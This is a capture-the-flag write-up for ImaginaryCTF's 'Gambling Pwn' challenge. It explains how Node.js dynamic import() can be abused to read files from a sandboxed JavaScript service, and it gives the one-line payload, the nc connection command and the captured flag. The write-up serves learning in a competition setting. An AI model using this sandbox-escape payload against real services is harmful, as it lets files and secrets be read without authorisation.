# Gambling Pwn — ImaginaryCTF Writeup

**Challenge:** Gambling Pwn  
**Category:** Misc  
**Difficulty:** Hard  
**Points:** 100 pts  
**Flag:** `ictf{w4s_1t_4_0day_0r_4Re_y0u_just_g00d_1n_g4mbl1ng}`

---

## Description

> Gambling jail? Nah, gambling pwn.

**Connection:** `nc 137.184.43.123 1337`

---

## Background Knowledge (Read This First!)

### What is Gambling Pwn?

Unlike gambling jail (where you bet numbers), **gambling pwn** gives you code execution in some sandboxed JavaScript-like environment. The goal is to escape the sandbox and read the flag file.

### What is the Node.js Dynamic Import Trick?

In Node.js, `import()` can dynamically load modules — including **files**. By importing `flag.txt` directly as a module path:

```javascript
(async () => {
    const f = 'flag.txt';
    console.log(await import(f));
})();
```

Node.js attempts to parse `flag.txt` as a module. Even though it fails as valid JS, the error message or the import result may **leak the file contents** — depending on the Node.js version and sandbox configuration.

This is a clever abuse of dynamic imports to read arbitrary files without using `fs` or `require`.

---

## Solution

### Step 1 — Connect to the server

```
┌──(zham㉿kali)-[/media/sf_downloads]
└─$ nc 137.184.43.123 1337
# → Server accepts JavaScript input
```

### Step 2 — Send the dynamic import payload

Paste this:

```javascript
(async () => { const f = 'flag.txt'; console.log(await import(f)); })();
```

### Step 3 — Read the flag from the output

```
ictf{w4s_1t_4_0day_0r_4Re_y0u_just_g00d_1n_g4mbl1ng}
```

---

## Tools Used

| Tool | Purpose | Level |
|------|---------|-------|
| `nc` | Connect and send the JavaScript payload | ⭐ Easy |
| Node.js dynamic import | Read flag.txt via module import abuse | ⭐⭐⭐ Hard |

---

## Key Takeaways

- Node.js `import()` can be abused to read files by treating them as module paths
- Sandbox escapes often abuse language features in unexpected ways
- The flag asks "was it a 0day or are you just good at gambling?" — the import trick is the intended solve
